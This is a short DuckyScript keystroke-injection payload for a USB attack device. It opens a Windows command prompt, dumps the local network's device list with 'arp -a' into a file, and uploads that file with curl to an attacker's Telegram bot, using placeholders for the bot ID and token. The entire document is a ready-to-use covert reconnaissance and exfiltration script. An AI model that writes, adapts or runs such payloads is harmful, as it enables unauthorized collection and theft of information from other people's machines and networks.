
REM check all devices in network and send the output to my telegram bot 

DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING arp -a > devices.txt
ENTER
DELAY 1000
STRING curl -F chat_id=<YOUR_TELEGRAM_BOT_ID> -F document=@devices.txt  https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendDocument
ENTER
DELAY 1000
STRING exit
ENTER
